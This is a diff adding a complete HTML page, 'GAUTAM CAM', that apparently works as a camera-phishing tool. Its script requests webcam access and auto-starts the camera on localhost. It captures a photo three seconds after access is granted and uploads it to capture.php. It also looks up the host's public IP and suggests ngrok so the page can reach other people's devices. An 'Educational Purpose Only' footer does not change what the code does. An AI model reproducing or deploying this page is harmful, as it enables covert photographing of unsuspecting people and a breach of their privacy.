@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GAUTAM CAM</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff;padding:20px}
+        .container{background:rgba(255,255,255,0.1);padding:30px;border-radius:20px;width:100%;max-width:500px;text-align:center;backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.2)}
+        .banner{background:linear-gradient(135deg,#f093fb,#f5576c);padding:12px;border-radius:10px;font-weight:bold;font-size:22px;margin-bottom:20px}
+        .camera-icon{font-size:60px;margin:10px 0}
+        .video-container{width:100%;height:250px;background:#000;border-radius:10px;margin:15px 0;overflow:hidden}
+        #video{width:100%;height:100%;object-fit:cover}
+        #canvas{display:none}
+        .btn{padding:14px 30px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;margin:8px;transition:0.3s}
+        .btn:hover{transform:scale(1.05)}
+        .btn:disabled{opacity:0.5;cursor:not-allowed}
+        .btn-secondary{background:linear-gradient(135deg,#4facfe,#00f2fe)}
+        .status{margin:10px 0;padding:10px;border-radius:8px;font-size:14px}
+        .success{background:rgba(46,204,113,0.3);color:#2ecc71}
+        .error{background:rgba(231,76,60,0.3);color:#e74c3c}
+        .info{background:rgba(52,152,219,0.3);color:#3498db}
+        .warning{background:rgba(255,193,7,0.3);color:#ffc107}
+        .footer{margin-top:20px;color:#888;font-size:12px}
+        .captured-img{width:100%;border-radius:10px;margin:10px 0;border:2px solid #f5576c}
+        .fix-box{background:rgba(255,193,7,0.15);padding:12px;border-radius:8px;color:#ffc107;font-size:13px;margin:10px 0;border-left:3px solid #ffc107}
+        .btn-group{display:flex;flex-wrap:wrap;justify-content:center;gap:8px}
+        .link-box{background:rgba(255,255,255,0.05);padding:10px;border-radius:8px;font-size:12px;word-break:break-all;margin:10px 0;color:#aaa}
+        .countdown{font-size:48px;font-weight:bold;color:#f5576c;margin:10px 0}
+        .url-box{background:rgba(79,172,254,0.1);padding:8px;border-radius:5px;color:#4facfe;font-size:11px;margin:5px 0}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="banner">📸 GAUTAM CAM</div>
+    <div class="camera-icon">📷</div>
+    <h2>Camera Access Required</h2>
+    
+    <div class="fix-box" id="fixBox">
+        💡 <strong>Fix:</strong> Use <strong>localhost</strong> or <strong>HTTPS</strong>
+        <br><small id="currentUrl"></small>
+    </div>
+    
+    <div class="url-box" id="urlBox"></div>
+    
+    <div class="video-container">
+        <video id="video" autoplay playsinline muted></video>
+    </div>
+    
+    <canvas id="canvas"></canvas>
+    
+    <div id="status" class="status info">🔴 Click "Start Camera"</div>
+    
+    <div id="countdownDisplay" class="countdown" style="display:none;"></div>
+    
+    <div class="btn-group">
+        <button class="btn" id="startBtn">🎥 Start Camera</button>
+        <button class="btn btn-secondary" id="captureBtn" disabled>📸 Capture</button>
+    </div>
+    
+    <div id="result"></div>
+    
+    <div class="link-box">
+        📱 Mobile: <a href="#" id="mobileLink" target="_blank">http://YOUR_IP:8080</a>
+    </div>
+    
+    <div class="footer">
+        🛡️ Educational Purpose Only | GAUTAM PROJECT
+    </div>
+</div>
+
+<script>
+console.log("🚀 GAUTAM CAM Starting...");
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const startBtn = document.getElementById('startBtn');
+const captureBtn = document.getElementById('captureBtn');
+const status = document.getElementById('status');
+const result = document.getElementById('result');
+const countdownDisplay = document.getElementById('countdownDisplay');
+const currentUrl = document.getElementById('currentUrl');
+const urlBox = document.getElementById('urlBox');
+const mobileLink = document.getElementById('mobileLink');
+
+// Show current URL
+const host = window.location.hostname;
+const protocol = window.location.protocol;
+const fullUrl = window.location.href;
+currentUrl.textContent = fullUrl;
+
+// Show if HTTPS or localhost
+if (host === 'localhost' || host === '127.0.0.1') {
+    urlBox.innerHTML = '✅ <strong>localhost</strong> - Camera will work!';
+    urlBox.style.color = '#2ecc71';
+} else if (protocol === 'https:') {
+    urlBox.innerHTML = '✅ <strong>HTTPS</strong> - Camera will work!';
+    urlBox.style.color = '#2ecc71';
+} else {
+    urlBox.innerHTML = '⚠️ <strong>HTTP</strong> + <strong>non-localhost</strong> - Camera may NOT work!<br>Use localhost or HTTPS';
+    urlBox.style.color = '#ffc107';
+}
+
+let stream = null;
+let isCapturing = false;
+let countdownInterval = null;
+
+// ==========================================
+// CHECK SUPPORT
+// ==========================================
+
+function checkSupport() {
+    if (!navigator.mediaDevices) {
+        status.className = 'status error';
+        status.textContent = '❌ Browser does not support camera! Use Chrome/Firefox';
+        return false;
+    }
+    if (typeof navigator.mediaDevices.getUserMedia !== 'function') {
+        status.className = 'status error';
+        status.textContent = '❌ getUserMedia not available! Use localhost or HTTPS';
+        return false;
+    }
+    return true;
+}
+
+// ==========================================
+// START CAMERA
+// ==========================================
+
+async function startCamera() {
+    if (!checkSupport()) {
+        startBtn.disabled = false;
+        return;
+    }
+
+    try {
+        status.className = 'status info';
+        status.textContent = '🔄 Requesting camera access...';
+        startBtn.disabled = true;
+        startBtn.textContent = '⏳ Please wait...';
+
+        const constraints = {
+            video: {
+                width: { ideal: 640 },
+                height: { ideal: 480 },
+                facingMode: 'user'
+            },
+            audio: false
+        };
+
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        
+        video.srcObject = stream;
+        await video.play();
+        
+        status.className = 'status success';
+        status.textContent = '✅ Camera connected! Auto-capturing in 3s...';
+        captureBtn.disabled = false;
+        startBtn.textContent = '🔄 Restart';
+        startBtn.disabled = false;
+        
+        // Auto capture after 3 seconds
+        setTimeout(() => {
+            if (stream && !isCapturing) {
+                capturePhoto();
+            }
+        }, 3000);
+
+    } catch (err) {
+        console.error("❌ Camera error:", err);
+        
+        let suggestion = '';
+        if (err.message.includes('Permission denied')) {
+            suggestion = '🔑 Allow camera permission in browser settings';
+        } else if (err.message.includes('HTTP') || err.message.includes('secure')) {
+            suggestion = '🔒 Use <strong>localhost</strong> or <strong>HTTPS</strong>!<br>Try: http://localhost:8080';
+        } else if (err.message.includes('NotFound')) {
+            suggestion = '📷 No camera found! Check your camera connection';
+        } else {
+            suggestion = '💡 Use localhost: http://localhost:8080';
+        }
+        
+        status.className = 'status error';
+        status.innerHTML = '❌ ' + suggestion;
+        startBtn.textContent = '🔄 Try Again';
+        startBtn.disabled = false;
+        
+        document.getElementById('fixBox').innerHTML = 
+            '⚠️ ' + suggestion + '<br><small>Error: ' + err.message + '</small>';
+    }
+}
+
+// ==========================================
+// CAPTURE PHOTO
+// ==========================================
+
+function capturePhoto() {
+    if (!stream) {
+        status.className = 'status error';
+        status.textContent = '❌ Camera not started!';
+        return;
+    }
+    
+    if (isCapturing) return;
+    isCapturing = true;
+    captureBtn.disabled = true;
+    
+    let count = 3;
+    countdownDisplay.style.display = 'block';
+    countdownDisplay.textContent = count;
+    
+    countdownInterval = setInterval(() => {
+        count--;
+        if (count > 0) {
+            countdownDisplay.textContent = count;
+            status.textContent = '⏳ Capturing in ' + count + '...';
+        } else {
+            clearInterval(countdownInterval);
+            countdownDisplay.style.display = 'none';
+            takeSnapshot();
+        }
+    }, 1000);
+}
+
+function takeSnapshot() {
+    const width = video.videoWidth || 640;
+    const height = video.videoHeight || 480;
+    
+    canvas.width = width;
+    canvas.height = height;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, width, height);
+    
+    const imageData = canvas.toDataURL('image/jpeg', 0.9);
+    
+    result.innerHTML = `
+        <img src="${imageData}" class="captured-img" alt="Captured">
+        <p style="color: #2ecc71; font-size: 14px;">✅ Photo captured!</p>
+    `;
+    
+    sendToServer(imageData);
+    
+    status.className = 'status success';
+    status.textContent = '📸 Photo captured and sent!';
+    
+    setTimeout(() => {
+        stopCamera();
+    }, 2000);
+}
+
+function sendToServer(imageData) {
+    fetch('capture.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'image=' + encodeURIComponent(imageData)
+    })
+    .then(response => response.text())
+    .then(data => console.log("✅ Server:", data))
+    .catch(err => console.error("❌ Server error:", err));
+}
+
+function stopCamera() {
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+        video.srcObject = null;
+    }
+    captureBtn.disabled = true;
+    startBtn.disabled = false;
+    startBtn.textContent = '🎥 Start Camera';
+    isCapturing = false;
+    if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownInterval = null;
+    }
+    countdownDisplay.style.display = 'none';
+}
+
+// ==========================================
+// EVENT LISTENERS
+// ==========================================
+
+startBtn.addEventListener('click', () => {
+    if (startBtn.textContent === '🔄 Restart') {
+        stopCamera();
+        setTimeout(startCamera, 500);
+    } else {
+        startCamera();
+    }
+});
+
+captureBtn.addEventListener('click', capturePhoto);
+
+// ==========================================
+// AUTO START ON LOCALHOST
+// ==========================================
+
+if (window.location.hostname === 'localhost' || 
+    window.location.hostname === '127.0.0.1') {
+    setTimeout(startCamera, 1000);
+}
+
+// Mobile link
+if (host !== 'localhost' && host !== '127.0.0.1') {
+    mobileLink.textContent = window.location.href;
+    mobileLink.href = window.location.href;
+} else {
+    fetch('http://ip-api.com/json/')
+    .then(res => res.json())
+    .then(data => {
+        mobileLink.textContent = 'http://' + data.query + ':8080';
+        mobileLink.href = 'http://' + data.query + ':8080';
+    })
+    .catch(() => {
+        mobileLink.textContent = 'Use ngrok for mobile access';
+    });
+}
+
+window.addEventListener('beforeunload', stopCamera);
+</script>
+</body>
+</html>
